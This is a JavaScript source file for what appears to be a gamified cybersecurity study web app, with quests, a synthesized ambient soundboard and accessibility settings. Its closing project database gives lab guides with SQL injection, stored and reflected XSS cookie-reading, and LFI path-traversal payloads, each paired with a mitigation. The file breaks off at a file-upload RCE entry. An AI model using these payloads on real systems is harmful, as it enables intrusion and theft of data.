            { text: "Open PDF Library", click: "document.querySelector('.nav-link[data-tab=\"pdf\"]').click()" }
        ]
    }
};

const adhdQuests = [
    {
        title: "Browse the PDF Library",
        desc: "Choose a cheat sheet in the PDF Library (e.g. Nmap or Wireshark), download it, and review its top 5 commands.",
        reward: "Reward: +50 XP / Doc Searcher",
        xp: 50
    },
    {
        title: "Take a Mini Practice Quiz",
        desc: "Open the Practice Quiz tab, select any domain (like Web Attacks), and answer 3 questions correctly.",
        reward: "Reward: +80 XP / Quiz Master",
        xp: 80
    },
    {
        title: "Study Notes Check-in",
        desc: "Open the Study Planner, choose your current Stage, and type at least two commands or notes you learned today.",
        reward: "Reward: +60 XP / Note Taker",
        xp: 60
    },
    {
        title: "Search a Tool Cheat Sheet",
        desc: "Choose a tool in the Tool Finder (e.g. nmap), click the PDF button, and find the flag scanning options on the cheat sheet.",
        reward: "Reward: +40 XP / Tool Knowledge Boost",
        xp: 40
    },
    {
        title: "Explore a GitHub Script",
        desc: "Go to the GitHub Scripts tab, find the 'PayloadsAllTheThings' repository or 'LinPEAS', and click 'Visit Repository' to explore it.",
        reward: "Reward: +80 XP / Source Explorer",
        xp: 80
    },
    {
        title: "Complete a Project Step",
        desc: "Go to the Project Hub, open a beginner project guide, check off the first 2 steps after reviewing their instructions.",
        reward: "Reward: +100 XP / Builder Hit",
        xp: 100
    }
];

let activeQuest = adhdQuests[0];

// Focus State Click Handler
adhdStateCards.forEach(card => {
    card.addEventListener('click', () => {
        adhdStateCards.forEach(c => c.classList.remove('active-state'));
        card.classList.add('active-state');
        
        const state = card.getAttribute('data-state');
        const recommendation = adhdRecommendations[state];
        
        if (recommendation) {
            adhdRecomText.textContent = recommendation.text;
            adhdRecomActions.innerHTML = '';
            recommendation.actions.forEach(action => {
                const btn = document.createElement('button');
                btn.className = 'tool-btn site-btn';
                btn.textContent = action.text;
                btn.onclick = new Function(action.click);
                adhdRecomActions.appendChild(btn);
            });
        }
    });
});

// Generate Quest Handler
function generateRandomQuest() {
    const randomIndex = Math.floor(Math.random() * adhdQuests.length);
    activeQuest = adhdQuests[randomIndex];
    
    if (adhdQuestTitle && adhdQuestDesc && adhdQuestReward) {
        const questBox = document.querySelector('.quest-box');
        questBox.style.opacity = '0.5';
        
        setTimeout(() => {
            adhdQuestTitle.textContent = activeQuest.title;
            adhdQuestDesc.innerHTML = activeQuest.desc;
            adhdQuestReward.textContent = activeQuest.reward;
            questBox.style.opacity = '1';
            if (adhdClaimQuestBtn) {
                adhdClaimQuestBtn.disabled = false;
                adhdClaimQuestBtn.textContent = "Claim Reward";
                adhdClaimQuestBtn.style.backgroundColor = "let(--color-success)";
                adhdClaimQuestBtn.style.borderColor = "let(--color-success)";
                adhdClaimQuestBtn.style.color = "#000000";
            }
        }, 150);
    }
}

if (adhdGenerateQuestBtn) {
    adhdGenerateQuestBtn.addEventListener('click', generateRandomQuest);
}

if (adhdClaimQuestBtn) {
    adhdClaimQuestBtn.addEventListener('click', () => {
        playDingSound();
        addXP(activeQuest.xp);
        adhdClaimQuestBtn.disabled = true;
        adhdClaimQuestBtn.textContent = `Claimed +${activeQuest.xp} XP!`;
        adhdClaimQuestBtn.style.backgroundColor = "rgba(0, 255, 102, 0.1)";
        adhdClaimQuestBtn.style.borderColor = "let(--border-card)";
        adhdClaimQuestBtn.style.color = "let(--text-secondary)";
        // Auto generate new quest after a small delay
        setTimeout(generateRandomQuest, 1500);
    });
}
// --- LOFI AMBIENT SOUNDBOARD HANDLERS ---
const volumeSliders = {
    'rain': document.getElementById('vol-rain'),
    'synth': document.getElementById('vol-synth'),
    'beats': document.getElementById('vol-beats'),
    'forest': document.getElementById('vol-forest'),
    'brown': document.getElementById('vol-brown')
};

// Procedural audio sources and states
let rainSource = null;
let rainGainNode = null;
let brownNoiseSource = null;
let brownNoiseGainNode = null;
let forestSource = null;
let forestGainNode = null;

// Synth pad state variables
let synthPadOscs = [];
let synthPadLFO = null;
let synthPadGainNode = null;
let synthPadFilterNode = null;

// Lofi beats sequencer state variables
let loFiBeatsInterval = null;
let loFiBeatsGainNode = null;
let currentBeat = 0;
const bpm = 75;
const stepTime = 60 / bpm / 2; // eighth notes = 400ms per step

// Web Audio synthesized sounds buffers
function createBrownNoiseBuffer(ctx, seconds) {
    const bufferSize = ctx.sampleRate * seconds;
    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
    const data = buffer.getChannelData(0);
    
    let lastOut = 0.0;
    for (let i = 0; i < bufferSize; i++) {
        const white = Math.random() * 2 - 1;
        data[i] = (lastOut + (0.02 * white)) / 1.02;
        lastOut = data[i];
        data[i] *= 3.5; 
    }
    return buffer;
}

function createForestBuffer(ctx, seconds) {
    const bufferSize = ctx.sampleRate * seconds;
    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
    const data = buffer.getChannelData(0);
    const sampleRate = ctx.sampleRate;
    
    let b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0, b6 = 0;
    for (let i = 0; i < bufferSize; i++) {
        const white = Math.random() * 2 - 1;
        b0 = 0.99886 * b0 + white * 0.0555179;
        b1 = 0.99332 * b1 + white * 0.0750759;
        b2 = 0.96900 * b2 + white * 0.1538520;
        b3 = 0.86650 * b3 + white * 0.3104856;
        b4 = 0.55000 * b4 + white * 0.5329522;
        b5 = -0.7616 * b5 - white * 0.0168980;
        const pink = b0 + b1 + b2 + b3 + b4 + b5 + b6 + white * 0.5362;
        b6 = white * 0.115926;
        
        const windMod = 0.35 + 0.25 * Math.sin(2 * Math.PI * 0.05 * (i / sampleRate));
        data[i] = pink * 0.05 * windMod;
    }

    const chirpTimes = [1.5, 4.2, 7.8];
    chirpTimes.forEach(startTime => {
        const startSample = Math.floor(startTime * sampleRate);
        const durationSamples = Math.floor(0.18 * sampleRate);
        for (let j = 0; j < durationSamples; j++) {
            const t = j / sampleRate;
            const freq = 3000 + 1500 * Math.sin(Math.PI * (j / durationSamples));
            const amp = 0.08 * Math.sin(Math.PI * (j / durationSamples));
            const sampleIdx = startSample + j;
            if (sampleIdx < bufferSize) {
                data[sampleIdx] += Math.sin(2 * Math.PI * freq * t) * amp;
            }
        }
    });

    return buffer;
}

function createRainBuffer(ctx, seconds) {
    const bufferSize = ctx.sampleRate * seconds;
    const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
    const data = buffer.getChannelData(0);
    
    let b0 = 0, b1 = 0, b2 = 0, b3 = 0, b4 = 0, b5 = 0, b6 = 0;
    for (let i = 0; i < bufferSize; i++) {
        const white = Math.random() * 2 - 1;
        b0 = 0.99886 * b0 + white * 0.0555179;
        b1 = 0.99332 * b1 + white * 0.0750759;
        b2 = 0.96900 * b2 + white * 0.1538520;
        b3 = 0.86650 * b3 + white * 0.3104856;
        b4 = 0.55000 * b4 + white * 0.5329522;
        b5 = -0.7616 * b5 - white * 0.0168980;
        const pink = b0 + b1 + b2 + b3 + b4 + b5 + b6 + white * 0.5362;
        b6 = white * 0.115926;
        
        data[i] = pink * 0.04;
        
        if (Math.random() < 0.0004) {
            const decay = Math.floor(ctx.sampleRate * 0.006);
            for (let j = 0; j < decay && (i + j) < bufferSize; j++) {
                const t = j / decay;
                data[i + j] += (Math.random() * 2 - 1) * 0.03 * Math.exp(-6 * t);
            }
        }
    }
    return buffer;
}

// Procedural real-time Synth Pads chords
function startSynthPads() {
    if (synthPadOscs.length > 0) return;
    
    const freqs = [130.81, 196.00, 311.13, 466.16]; // C3, G3, D#4, A#4
    const detunes = [-5, 4, -3, 6];
    
    synthPadFilterNode = audioCtx.createBiquadFilter();
    synthPadFilterNode.type = 'lowpass';
    synthPadFilterNode.frequency.setValueAtTime(600, audioCtx.currentTime);
    synthPadFilterNode.Q.setValueAtTime(1.5, audioCtx.currentTime);
    
    synthPadLFO = audioCtx.createOscillator();
    synthPadLFO.frequency.setValueAtTime(0.08, audioCtx.currentTime);
    const lfoGain = audioCtx.createGain();
    lfoGain.gain.setValueAtTime(300, audioCtx.currentTime);
    
    synthPadLFO.connect(lfoGain);
    lfoGain.connect(synthPadFilterNode.frequency);
    
    synthPadGainNode = audioCtx.createGain();
    const slider = volumeSliders['synth'];
    const vol = slider ? parseFloat(slider.value) : 0.4;
    synthPadGainNode.gain.setValueAtTime(vol, audioCtx.currentTime);
    
    synthPadFilterNode.connect(synthPadGainNode);
    synthPadGainNode.connect(audioCtx.destination);
    
    freqs.forEach((freq, idx) => {
        const osc = audioCtx.createOscillator();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
        osc.detune.setValueAtTime(detunes[idx], audioCtx.currentTime);
        osc.connect(synthPadFilterNode);
        osc.start(0);
        synthPadOscs.push(osc);
    });
    
    synthPadLFO.start(0);
}

function stopSynthPads() {
    synthPadOscs.forEach(osc => {
        try { osc.stop(0); } catch(e){}
    });
    synthPadOscs = [];
    if (synthPadLFO) {
        try { synthPadLFO.stop(0); } catch(e){}
        synthPadLFO = null;
    }
    synthPadGainNode = null;
    synthPadFilterNode = null;
}

// Procedural real-time chill drum beat and jazz chord loop
function playLoFiBeats() {
    if (loFiBeatsInterval) return;
    
    loFiBeatsGainNode = audioCtx.createGain();
    const slider = volumeSliders['beats'];
    const vol = slider ? parseFloat(slider.value) : 0.4;
    loFiBeatsGainNode.gain.setValueAtTime(vol, audioCtx.currentTime);
    loFiBeatsGainNode.connect(audioCtx.destination);
    
    let nextStepTime = audioCtx.currentTime;
    currentBeat = 0;
    
    function scheduler() {
        while (nextStepTime < audioCtx.currentTime + 0.2) {
            scheduleStep(currentBeat, nextStepTime);
            nextStepTime += stepTime;
            currentBeat = (currentBeat + 1) % 16;
        }
        loFiBeatsInterval = setTimeout(scheduler, 50);
    }
    scheduler();
}

function stopLoFiBeats() {
    if (loFiBeatsInterval) {
        clearTimeout(loFiBeatsInterval);
        loFiBeatsInterval = null;
    }
    loFiBeatsGainNode = null;
}

const chordEbmaj7 = [155.56, 196.00, 233.08, 293.66]; // Eb3, G3, Bb3, D4
const chordDm7 = [146.83, 174.61, 220.00, 261.63]; // D3, F3, A3, C4

function scheduleStep(step, time) {
    const kickSteps = [0, 6, 8, 14];
    const snareSteps = [4, 12];
    const hatSteps = [0, 2, 4, 6, 8, 10, 12, 14];
    
    if (kickSteps.includes(step)) {
        playSynthKick(time);
    }
    if (snareSteps.includes(step)) {
        playSynthSnare(time);
    }
    if (hatSteps.includes(step)) {
        const vol = 0.04 + Math.random() * 0.02;
        playSynthHat(time, vol);
    }
    if (step === 0) {
        playChord(chordEbmaj7, time, 3.0);
    }
    if (step === 8) {
        playChord(chordDm7, time, 3.0);
    }
}

function playSynthKick(time) {
    if (!loFiBeatsGainNode) return;
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(loFiBeatsGainNode);
    
    osc.frequency.setValueAtTime(110, time);
    osc.frequency.exponentialRampToValueAtTime(45, time + 0.12);
    
    gain.gain.setValueAtTime(0, time);
    gain.gain.linearRampToValueAtTime(0.4, time + 0.005);
    gain.gain.exponentialRampToValueAtTime(0.001, time + 0.22);
    
    osc.start(time);
    osc.stop(time + 0.23);
}

function playSynthSnare(time) {
    if (!loFiBeatsGainNode) return;
    const bufferSize = audioCtx.sampleRate * 0.12;
    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
    const data = buffer.getChannelData(0);
    for (let i = 0; i < bufferSize; i++) {
        data[i] = Math.random() * 2 - 1;
    }
    
    const noise = audioCtx.createBufferSource();
    noise.buffer = buffer;
    
    const filter = audioCtx.createBiquadFilter();
    filter.type = 'bandpass';
    filter.frequency.setValueAtTime(950, time);
    filter.Q.setValueAtTime(1.8, time);
    
    const gain = audioCtx.createGain();
    noise.connect(filter);
    filter.connect(gain);
    gain.connect(loFiBeatsGainNode);
    
    gain.gain.setValueAtTime(0, time);
    gain.gain.linearRampToValueAtTime(0.2, time + 0.005);
    gain.gain.exponentialRampToValueAtTime(0.001, time + 0.1);
    
    noise.start(time);
    noise.stop(time + 0.11);
    
    const osc = audioCtx.createOscillator();
    const oscGain = audioCtx.createGain();
    osc.frequency.setValueAtTime(175, time);
    osc.connect(oscGain);
    oscGain.connect(loFiBeatsGainNode);
    
    oscGain.gain.setValueAtTime(0, time);
    oscGain.gain.linearRampToValueAtTime(0.12, time + 0.004);
    oscGain.gain.exponentialRampToValueAtTime(0.001, time + 0.08);
    
    osc.start(time);
    osc.stop(time + 0.09);
}

function playSynthHat(time, velocity) {
    if (!loFiBeatsGainNode) return;
    const bufferSize = audioCtx.sampleRate * 0.03;
    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
    const data = buffer.getChannelData(0);
    for (let i = 0; i < bufferSize; i++) {
        data[i] = Math.random() * 2 - 1;
    }
    
    const noise = audioCtx.createBufferSource();
    noise.buffer = buffer;
    
    const filter = audioCtx.createBiquadFilter();
    filter.type = 'highpass';
    filter.frequency.setValueAtTime(7500, time);
    
    const gain = audioCtx.createGain();
    noise.connect(filter);
    filter.connect(gain);
    gain.connect(loFiBeatsGainNode);
    
    gain.gain.setValueAtTime(0, time);
    gain.gain.linearRampToValueAtTime(velocity, time + 0.002);
    gain.gain.exponentialRampToValueAtTime(0.001, time + 0.025);
    
    noise.start(time);
    noise.stop(time + 0.03);
}

function playChord(notes, time, duration) {
    if (!loFiBeatsGainNode) return;
    notes.forEach(freq => {
        const osc = audioCtx.createOscillator();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(freq, time);
        
        const filter = audioCtx.createBiquadFilter();
        filter.type = 'lowpass';
        filter.frequency.setValueAtTime(450, time);
        
        const gain = audioCtx.createGain();
        osc.connect(filter);
        filter.connect(gain);
        gain.connect(loFiBeatsGainNode);
        
        gain.gain.setValueAtTime(0, time);
        gain.gain.linearRampToValueAtTime(0.06, time + 0.15);
        gain.gain.exponentialRampToValueAtTime(0.001, time + duration);
        
        osc.start(time);
        osc.stop(time + duration + 0.1);
    });
}

// Procedural synthesizer play engine
const synthBtns = document.querySelectorAll('.soundboard-synth-btn');
synthBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const synthType = btn.getAttribute('data-synth');
        
        try {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
            if (audioCtx.state === 'suspended') {
                audioCtx.resume();
            }
        } catch(e) {
            console.error("AudioContext initialization failed", e);
            return;
        }

        if (synthType === 'rain') {
            if (rainSource) {
                try { rainSource.stop(0); } catch(e){}
                rainSource = null;
                btn.classList.remove('playing');
                btn.style.backgroundColor = "rgba(0,255,102,0.1)";
                btn.style.color = "let(--color-accent)";
                btn.textContent = 'Play';
            } else {
                const buffer = createRainBuffer(audioCtx, 6);
                rainSource = audioCtx.createBufferSource();
                rainSource.buffer = buffer;
                rainSource.loop = true;

                rainGainNode = audioCtx.createGain();
                const slider = volumeSliders['rain'];
                const vol = slider ? parseFloat(slider.value) : 0.5;
                rainGainNode.gain.setValueAtTime(vol, audioCtx.currentTime);

                rainSource.connect(rainGainNode);
                rainGainNode.connect(audioCtx.destination);
                
                rainSource.start(0);
                btn.classList.add('playing');
                btn.style.backgroundColor = "let(--color-success)";
                btn.style.color = "#000000";
                btn.textContent = 'Pause';
            }
        } else if (synthType === 'synth') {
            if (synthPadOscs.length > 0) {
                stopSynthPads();
                btn.classList.remove('playing');
                btn.style.backgroundColor = "rgba(0,255,102,0.1)";
                btn.style.color = "let(--color-accent)";
                btn.textContent = 'Play';
            } else {
                startSynthPads();
                btn.classList.add('playing');
                btn.style.backgroundColor = "let(--color-success)";
                btn.style.color = "#000000";
                btn.textContent = 'Pause';
            }
        } else if (synthType === 'beats') {
            if (loFiBeatsInterval) {
                stopLoFiBeats();
                btn.classList.remove('playing');
                btn.style.backgroundColor = "rgba(0,255,102,0.1)";
                btn.style.color = "let(--color-accent)";
                btn.textContent = 'Play';
            } else {
                playLoFiBeats();
                btn.classList.add('playing');
                btn.style.backgroundColor = "let(--color-success)";
                btn.style.color = "#000000";
                btn.textContent = 'Pause';
            }
        } else if (synthType === 'brown') {
            if (brownNoiseSource) {
                try { brownNoiseSource.stop(0); } catch(e){}
                brownNoiseSource = null;
                btn.classList.remove('playing');
                btn.style.backgroundColor = "rgba(0,255,102,0.1)";
                btn.style.color = "let(--color-accent)";
                btn.textContent = 'Play';
            } else {
                const buffer = createBrownNoiseBuffer(audioCtx, 5);
                brownNoiseSource = audioCtx.createBufferSource();
                brownNoiseSource.buffer = buffer;
                brownNoiseSource.loop = true;

                brownNoiseGainNode = audioCtx.createGain();
                const slider = volumeSliders['brown'];
                const vol = slider ? parseFloat(slider.value) : 0.5;
                brownNoiseGainNode.gain.setValueAtTime(vol, audioCtx.currentTime);

                brownNoiseSource.connect(brownNoiseGainNode);
                brownNoiseGainNode.connect(audioCtx.destination);
                
                brownNoiseSource.start(0);
                btn.classList.add('playing');
                btn.style.backgroundColor = "let(--color-success)";
                btn.style.color = "#000000";
                btn.textContent = 'Pause';
            }
        } else if (synthType === 'forest') {
            if (forestSource) {
                try { forestSource.stop(0); } catch(e){}
                forestSource = null;
                btn.classList.remove('playing');
                btn.style.backgroundColor = "rgba(0,255,102,0.1)";
                btn.style.color = "let(--color-accent)";
                btn.textContent = 'Play';
            } else {
                const buffer = createForestBuffer(audioCtx, 10);
                forestSource = audioCtx.createBufferSource();
                forestSource.buffer = buffer;
                forestSource.loop = true;

                forestGainNode = audioCtx.createGain();
                const slider = volumeSliders['forest'];
                const vol = slider ? parseFloat(slider.value) : 0.5;
                forestGainNode.gain.setValueAtTime(vol, audioCtx.currentTime);

                forestSource.connect(forestGainNode);
                forestGainNode.connect(audioCtx.destination);

                forestSource.start(0);
                btn.classList.add('playing');
                btn.style.backgroundColor = "let(--color-success)";
                btn.style.color = "#000000";
                btn.textContent = 'Pause';
            }
        }
    });
});

if (volumeSliders['rain']) {
    volumeSliders['rain'].addEventListener('input', (e) => {
        if (rainGainNode && audioCtx) {
            rainGainNode.gain.setValueAtTime(parseFloat(e.target.value), audioCtx.currentTime);
        }
    });
}
if (volumeSliders['synth']) {
    volumeSliders['synth'].addEventListener('input', (e) => {
        if (synthPadGainNode && audioCtx) {
            synthPadGainNode.gain.setValueAtTime(parseFloat(e.target.value), audioCtx.currentTime);
        }
    });
}
if (volumeSliders['beats']) {
    volumeSliders['beats'].addEventListener('input', (e) => {
        if (loFiBeatsGainNode && audioCtx) {
            loFiBeatsGainNode.gain.setValueAtTime(parseFloat(e.target.value), audioCtx.currentTime);
        }
    });
}
if (volumeSliders['brown']) {
    volumeSliders['brown'].addEventListener('input', (e) => {
        if (brownNoiseGainNode && audioCtx) {
            brownNoiseGainNode.gain.setValueAtTime(parseFloat(e.target.value), audioCtx.currentTime);
        }
    });
}
if (volumeSliders['forest']) {
    volumeSliders['forest'].addEventListener('input', (e) => {
        if (forestGainNode && audioCtx) {
            forestGainNode.gain.setValueAtTime(parseFloat(e.target.value), audioCtx.currentTime);
        }
    });
}

let topicsChartInstance = null;

// --- ACCESSIBILITY SETTINGS CENTER CONTROL ENGINE ---
function applyTheme(theme) {
    document.body.classList.remove('theme-light-adhd', 'theme-calm', 'theme-dyslexia', 'theme-contrast', 'theme-light');
    if (theme === 'light') {
        document.body.classList.add('theme-light');
        document.body.classList.add('theme-light-adhd');
    } else if (theme !== 'default') {
        document.body.classList.add(`theme-${theme}`);
    }
    localStorage.setItem('roadmap-theme', theme);
    updateDynamicElements();
}

function updateDynamicElements() {
    renderTopicsGraph();
    renderMermaidDiagrams();
}

function initMermaid() {
    document.querySelectorAll('.mermaid').forEach((el) => {
        if (!el.getAttribute('data-mermaid-src')) {
            el.setAttribute('data-mermaid-src', el.textContent.trim());
        }
    });
    renderMermaidDiagrams();
}

function renderMermaidDiagrams() {
    if (typeof mermaid === 'undefined') return;
    const isLightMode = document.body.classList.contains('theme-light-adhd');
    const themeName = isLightMode ? 'default' : 'dark';
    
    document.querySelectorAll('.mermaid').forEach((el) => {
        const src = el.getAttribute('data-mermaid-src');
        if (src) {
            el.removeAttribute('data-processed');
            el.textContent = src;
        }
    });
    
    mermaid.initialize({
        startOnLoad: false,
        theme: themeName,
        securityLevel: 'loose',
        themeVariables: isLightMode ? {
            background: '#ffffff',
            primaryColor: '#eff6ff',
            primaryTextColor: '#0f172a',
            lineColor: '#cbd5e1',
            secondaryColor: '#f1f5f9',
            tertiaryColor: '#f8fafc'
        } : {
            background: '#040f08',
            primaryColor: '#00200a',
            primaryTextColor: '#e1ffd6',
            lineColor: '#00ff66',
            secondaryColor: '#001005',
            tertiaryColor: '#000502'
        }
    });
    
    mermaid.run();
}

function applyFont(enable) {
    if (enable) {
        document.body.style.fontFamily = "'Lexend', 'Comic Neue', sans-serif";
    } else {
        document.body.style.fontFamily = "";
    }
    localStorage.setItem('roadmap-font', enable);
}

function applySpacing(enable) {
    if (enable) {
        document.body.classList.add('increased-spacing');
    } else {
        document.body.classList.remove('increased-spacing');
    }
    localStorage.setItem('roadmap-spacing', enable);
}

function applyMotion(disabled) {
    if (disabled) {
        document.body.classList.add('no-animations');
    } else {
        document.body.classList.remove('no-animations');
    }
    localStorage.setItem('roadmap-motion-disabled', disabled);
}

function initAccessibility() {
    const savedTheme = localStorage.getItem('roadmap-theme') || 'default';
    const themeSelect = document.getElementById('acc-theme-select');
    if (themeSelect) themeSelect.value = savedTheme;
    applyTheme(savedTheme);

    const savedFont = localStorage.getItem('roadmap-font') === 'true';
    const fontToggle = document.getElementById('acc-font-toggle');
    if (fontToggle) fontToggle.checked = savedFont;
    applyFont(savedFont);

    const savedSpacing = localStorage.getItem('roadmap-spacing') === 'true';
    const spacingToggle = document.getElementById('acc-spacing-toggle');
    if (spacingToggle) spacingToggle.checked = savedSpacing;
    applySpacing(savedSpacing);

    const savedMotion = localStorage.getItem('roadmap-motion-disabled') === 'true';
    const motionToggle = document.getElementById('acc-motion-toggle');
    if (motionToggle) motionToggle.checked = savedMotion;
    applyMotion(savedMotion);

    const savedSound = localStorage.getItem('roadmap-sound-enabled') !== 'false';
    const soundToggle = document.getElementById('acc-sound-toggle');
    if (soundToggle) soundToggle.checked = savedSound;
}

const themeSelect = document.getElementById('acc-theme-select');
const fontToggle = document.getElementById('acc-font-toggle');
const spacingToggle = document.getElementById('acc-spacing-toggle');
const motionToggle = document.getElementById('acc-motion-toggle');
const soundToggle = document.getElementById('acc-sound-toggle');

if (themeSelect) themeSelect.addEventListener('change', (e) => applyTheme(e.target.value));
if (fontToggle) fontToggle.addEventListener('change', (e) => applyFont(e.target.checked));
if (spacingToggle) spacingToggle.addEventListener('change', (e) => applySpacing(e.target.checked));
if (motionToggle) motionToggle.addEventListener('change', (e) => applyMotion(e.target.checked));
if (soundToggle) {
    soundToggle.addEventListener('change', (e) => {
        localStorage.setItem('roadmap-sound-enabled', e.target.checked);
    });
}

initAccessibility();

// --- BREAK IT DOWN TASK PARALYSIS GENERATOR ---
const stageBreakdowns = {
    1: [
        "Open your command prompt or terminal and run `ping 8.8.8.8` to test network latency (under 30s).",
        "Type `ipconfig` (Windows) or `ip a` (Linux/Mac) to find your local IP address (under 30s).",
        "Open a new browser tab and check your internet connection speed on fast.com (under 60s)."
    ],
    2: [
        "Open your terminal and type `cd ~ && pwd` to print your user directory path (under 15s).",
        "Run `dir` (Windows) or `ls` (Linux/Mac) to list files in your folder (under 30s).",
        "Type `whoami` in command prompt to find your system username (under 15s)."
    ],
    3: [
        "Type `python --version` or `git --version` in terminal to check if tools are installed (under 20s).",
        "Open your browser console (F12 -> Console) and execute: `console.log('Test Complete')` (under 40s).",
        "Initialize a dummy repository by running `git init my-test-repo` in terminal (under 40s)."
    ],
    4: [
        "Open terminal and run `nmap --help` to inspect host discovery flags (under 30s).",
        "Look up the definition of 'Active Directory Domain Controller' in a new search tab (under 60s).",
        "Run `nslookup google.com` in your terminal to see DNS name resolution in action (under 30s)."
    ],
    5: [
        "Open your browser, right click on any dashboard element, and click 'Inspect' (under 40s).",
        "Look at the URL bar of any website and locate where query parameters begin with `?` (under 20s).",
        "Read the summary of 'OWASP Top 1: Broken Access Control' on owasp.org (under 60s)."
    ],
    6: [
        "Open your command line and check if you have python installed by running `python --version` (under 20s).",
        "Create a simple text file named test.txt and view its size in bytes in your file manager (under 40s).",
        "Look up the meaning of 'x86_64 CPU assembly registers' in a new search tab (under 60s)."
    ]
};

const breakdownSelect = document.getElementById('breakdown-stage-select');
const breakdownGenerateBtn = document.getElementById('breakdown-generate-btn');
const breakdownContainer = document.getElementById('breakdown-steps-container');
const breakdownStageNum = document.getElementById('breakdown-stage-num');
const breakdownList = document.getElementById('breakdown-list');
const breakdownRewardAlert = document.getElementById('breakdown-reward-alert');

if (breakdownGenerateBtn) {
    breakdownGenerateBtn.addEventListener('click', () => {
        const stage = breakdownSelect.value;
        const steps = stageBreakdowns[stage];
        if (!steps) return;

        breakdownStageNum.textContent = stage;
        breakdownList.innerHTML = '';
        breakdownRewardAlert.style.display = 'none';

        steps.forEach((step, idx) => {
            const label = document.createElement('label');
            label.className = 'checklist-item';
            label.style.display = 'flex';
            label.style.alignItems = 'flex-start';
            label.style.gap = '8px';
            label.style.marginBottom = '8px';
            label.style.fontSize = '0.85rem';
            label.style.cursor = 'pointer';

            label.innerHTML = `
                <input type="checkbox" class="breakdown-cb" style="margin-top: 3px;" data-idx="${idx}">
                <span style="line-height: 1.4;">${step}</span>
            `;
            breakdownList.appendChild(label);
        });

        breakdownContainer.style.display = 'block';

        const cbs = breakdownList.querySelectorAll('.breakdown-cb');
        cbs.forEach(cb => {
            cb.addEventListener('change', () => {
                if (cb.checked) {
                    playDingSound();
                    const lbl = cb.closest('.checklist-item');
                    if (lbl) {
                        lbl.classList.remove('pulse-success');
                        void lbl.offsetWidth;
                        lbl.classList.add('pulse-success');
                    }
                }

                const allChecked = Array.from(cbs).every(c => c.checked);
                if (allChecked) {
                    addXP(30);
                    breakdownRewardAlert.style.display = 'block';
                    cbs.forEach(c => c.disabled = true);
                }
            });
        });
    });
}

// Initial render call
renderGitScripts();

// ================================
// 100 Cybersecurity Project Sessions Database
// ================================
const projectsData = [
    // Web Hacking (1-17)
    {
        id: 1,
        title: "SQL Injection on Login Form",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2-3 Hours",
        xp: 50,
        description: "Bypass an authentication form using SQL payload injections and extract hidden administrative table records.",
        guide: {
            objective: "Bypass authentication checks on a login form using SQL injection payloads.",
            labSetup: "Deploy a vulnerable web app (e.g. DVWA, WebGoat) or setup a local Node.js app with an unparameterized SQL query.",
            steps: [
                "Locate the input fields for Username and Password on the login page.",
                "Input a single quote (') into the Username field to see if it generates a database error.",
                "Inject the classic payload: admin' OR '1'='1 in the username field with any password.",
                "Verify access is granted to the administrative dashboard without knowing the secret password."
            ],
            commands: "SQL Username Payload:\nadmin' OR '1'='1\nadmin' --\n' UNION SELECT NULL, username, password FROM users --",
            mitigation: "Use parameterized queries (prepared statements) and ORM libraries. Never concatenate user input directly into SQL execution strings."
        }
    },
    {
        id: 2,
        title: "Stored XSS in Comments Section",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "2 Hours",
        xp: 50,
        description: "Inject malicious Javascript payloads into a database-stored comment section to hijack browser sessions.",
        guide: {
            objective: "Execute arbitrary Javascript in the browser of other users visiting the comments page.",
            labSetup: "Vulnerable comments guestbook page or mock site with a comment posting form.",
            steps: [
                "Locate the text area for posting public comments.",
                "Submit a test comment containing basic HTML tags (e.g., <b>test</b>) to see if they are rendered.",
                "Inject a script tag: <script>alert(document.cookie)</script>.",
                "Refresh the page to verify if the alert box triggers on every page view, indicating successful stored script execution."
            ],
            commands: "Stored XSS Payloads:\n<script>alert(document.cookie)</script>\n<img src=x onerror=alert('StoredXSS')>",
            mitigation: "Sanitize and escape all user outputs before rendering. Implement a Content Security Policy (CSP) and use HttpOnly flags for cookies."
        }
    },
    {
        id: 3,
        title: "Reflected XSS via URL Parameter",
        category: "web-hacking",
        difficulty: "beginner",
        duration: "1-2 Hours",
        xp: 50,
        description: "Exploit search boxes or echo parameters that print user input back to the browser without sanitization.",
        guide: {
            objective: "Trigger reflected scripting by sending a crafted URL with malicious parameters to a user.",
            labSetup: "Web application displaying 'Search results for: [user input]' using URL query strings.",
            steps: [
                "Identify search fields or query parameters in the URL (e.g., ?q=test).",
                "Substitute the search query with: <script>alert('Reflected')</script>.",
                "Execute the request and inspect if the browser interprets the script tag.",
                "Verify if the script executes immediately and only for that specific request lifecycle."
            ],
            commands: "Reflected XSS URL Example:\nhttp://target.local/search.php?q=%3Cscript%3Ealert(1)%3C/script%3E",
            mitigation: "Encode output contextually (HTML entity encoding). Sanitize URL query parameters using robust validation libraries."
        }
    },
    {
        id: 4,
        title: "LFI: Local File Inclusion",
        category: "web-hacking",
        difficulty: "intermediate",
        duration: "3 Hours",
        xp: 75,
        description: "Manipulate file path parameters to access sensitive OS documents like /etc/passwd or win.ini.",
        guide: {
            objective: "Retrieve system configurations by exploiting vulnerabilities in parameter file inclusion.",
            labSetup: "PHP web application utilizing standard file loading scripts (e.g., include($_GET['page'])).",
            steps: [
                "Find URL parameters loading dynamic pages (e.g., index.php?page=welcome.php).",
                "Attempt to traverse directory paths using directory delimiters: ../../../etc/passwd.",
                "Examine response data for files that are outside the web document root directory.",
                "Experiment with PHP filter wrappers to read source code (e.g., php://filter/convert.base64-encode/resource=index)."
            ],
            commands: "LFI Traversal Payloads:\n?page=../../../../etc/passwd\n?page=../../../../windows/win.ini\n?page=php://filter/convert.base64-encode/resource=config.php",
            mitigation: "Avoid user-supplied input inside file paths. Implement strict whitelists of allowed page variables instead of dynamic inclusions."
        }
    },
    {
        id: 5,
        title: "RCE via File Upload Bypass",
